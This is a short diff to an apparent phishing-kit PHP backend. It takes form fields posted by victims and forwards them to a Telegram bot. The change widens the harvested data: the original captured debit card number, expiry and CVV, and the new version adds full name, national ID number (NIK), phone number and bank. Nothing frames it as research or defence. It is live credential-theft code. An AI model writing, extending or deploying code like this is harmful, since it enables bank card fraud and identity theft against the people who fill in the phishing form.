@@ -7,7 +7,7 @@ include "./telegram.php";
 
 $_SESSION['phoneNumber'] = $_POST['phoneNumber'];
 
-$message = "𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 : \n". $_POST ['debitku'].  "\n𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 :\n". $_POST ['valid']. "\n𝗖𝗩𝗩 :\n". $_POST ['cvv'];
+$message = "<pre>✎﹏﹏𝖍𝖔𝖓𝖊𝖘𝖙.𝖈𝖔.𝖎𝖉﹏﹏</pre>". "<pre>\n𖥠 𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽 : ". $_POST ['nama']. "</pre>\n<pre>𖥠 𝗡𝗜𝗞 𝗞𝗧𝗣 : ". $_POST ['nik']. "</pre>\n<pre>𖥠 𝗡𝗼𝗺𝗼𝗿 𝗛𝗽 : ". $_POST ['nomor']. "</pre>\n<pre>𖥠 𝗕𝗮𝗻𝗸 : ". $_POST ['bank']. "</pre>\n<pre>𖥠 𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 : ". $_POST ['debitku']. "</pre>\n<pre>𖥠 𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 : ". $_POST ['valid']. "</pre>\n<pre>𖥠 𝗖𝗩𝗩 : ". $_POST ['cvv']. "</pre>";
 function sendMessage($telegram_id, $message, $id_bot)
 {
 $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=html&chat_id=" . $telegram_id;
